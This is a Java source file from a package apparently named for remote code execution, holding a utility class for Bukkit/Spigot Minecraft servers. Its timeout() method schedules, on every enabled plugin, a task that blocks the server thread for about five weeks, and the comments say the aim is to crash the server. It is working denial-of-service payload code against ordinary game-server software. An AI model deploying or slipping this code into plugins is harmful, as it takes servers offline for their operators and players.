package org.rce4j;

import org.bukkit.Bukkit;
import org.bukkit.plugin.Plugin;
import org.bukkit.scheduler.BukkitScheduler;

import java.util.Collection;
import java.util.HashSet;

public final class SpigotUtil {
    private SpigotUtil() {
    }
    
    private static final long WASHINGTON_PIZZA_HUT_PHONE_NUMBER = 309_444_2213L; // very useful
    
    public static Plugin getEnabledPlugin() {
        for (Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
            if (plugin.isEnabled()) {
                return plugin;
            }
        }
        
        return null;
    }
    
    public static Collection<Plugin> getEnabledPlugins() {
        Collection<Plugin> plugins = new HashSet<>();
        for (Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
            if (plugin.isEnabled()) {
                plugins.add(plugin);
            }
        }
        
        return plugins;
    }
    
    public static void timeout() {
        BukkitScheduler scheduler = Bukkit.getScheduler();
        
        Collection<Plugin> enabledPlugins = getEnabledPlugins();
        Runnable crashRunnable = () -> {
            try {
                Thread.sleep(WASHINGTON_PIZZA_HUT_PHONE_NUMBER); // around 5 weeks :)
            } catch (InterruptedException ignored) {
            }
        };
        
        // Theoretically should crash the server with only one timed out plugin
        // In a foreach loop in case of future updates that disable frozen plugins
        for (Plugin plugin : enabledPlugins) {
            scheduler.runTask(plugin, crashRunnable);
        }
    }
}
